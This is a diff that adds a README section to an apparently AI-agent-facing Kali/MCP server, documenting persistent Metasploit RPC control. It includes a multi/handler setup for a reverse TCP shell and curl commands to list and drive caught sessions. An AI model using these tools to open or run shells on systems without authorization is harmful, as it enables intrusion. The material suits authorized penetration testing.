@@ -156,6 +156,58 @@ Edit:
 
 - Simply add an MCP with the command `python3 /absolute/path/to/client.py --server http://LINUX_IP:5000` and it will automatically generate the needed configuration files.
 
+## 🎯 Metasploit RPC sessions (persistent shells)
+
+The one-shot `metasploit_run` tool runs a module and returns — it can't hold a
+listener or interact with a caught shell. The `msf_*` tools add **persistent**
+Metasploit control over `msfrpcd` (Metasploit's MessagePack RPC daemon), so an
+agent can start a handler as a background job and drive a live session across
+separate calls.
+
+### Prerequisites (on the Kali box)
+
+```bash
+pip install pymetasploit3                          # into your .venv
+msfrpcd -P <password> -S -a 127.0.0.1 -p 55553     # start the RPC daemon
+export MSFRPCD_PASSWORD=<password>                 # must match, then run server.py
+```
+
+Optional env vars: `MSFRPCD_HOST` (default `127.0.0.1`), `MSFRPCD_PORT` (default
+`55553`), `MSFRPCD_SSL` (`1` to use TLS — then drop the `-S` flag above). The
+`/health` endpoint reports `metasploit_rpc: {configured, reachable}`.
+
+### Tools / endpoints
+
+| MCP tool (`kali_*`) | Endpoint | Purpose |
+| --- | --- | --- |
+| `msf_console_create` | `POST /api/msf/console/create` | Open a persistent console |
+| `msf_console_write` | `POST /api/msf/console/write` | Run a console command, return output |
+| `msf_console_read` | `POST /api/msf/console/read` | Poll console output (reports `busy`) |
+| `msf_console_destroy` | `POST /api/msf/console/destroy` | Close a console |
+| `msf_handler` | `POST /api/msf/handler` | Start `multi/handler` as a background job |
+| `msf_sessions` | `GET /api/msf/sessions` | List live sessions |
+| `msf_session_write` | `POST /api/msf/session/write` | Run a command in a session (`type`: shell/meterpreter) |
+| `msf_session_read` | `POST /api/msf/session/read` | Read session output |
+
+### Quick test
+
+```bash
+# 1. Start a handler (background job — returns immediately, does not block)
+curl -s -XPOST localhost:5000/api/msf/handler -H 'content-type: application/json' \
+  -d '{"payload":"generic/shell_reverse_tcp","lhost":"<kali-ip>","lport":"4444"}'
+
+# 2. Trigger your payload against the AUTHORIZED target, then list sessions
+curl -s localhost:5000/api/msf/sessions
+
+# 3. Drive the caught shell (session id comes from step 2)
+curl -s -XPOST localhost:5000/api/msf/session/write -H 'content-type: application/json' \
+  -d '{"session_id":"1","command":"id"}'
+curl -s -XPOST localhost:5000/api/msf/session/read -H 'content-type: application/json' \
+  -d '{"session_id":"1"}'
+```
+
+Only use these against systems you are authorized to test.
+
 ## 🔮 Other Possibilities
 
 There are more possibilities than described since the AI model can now execute commands on the terminal. Here are some examples:
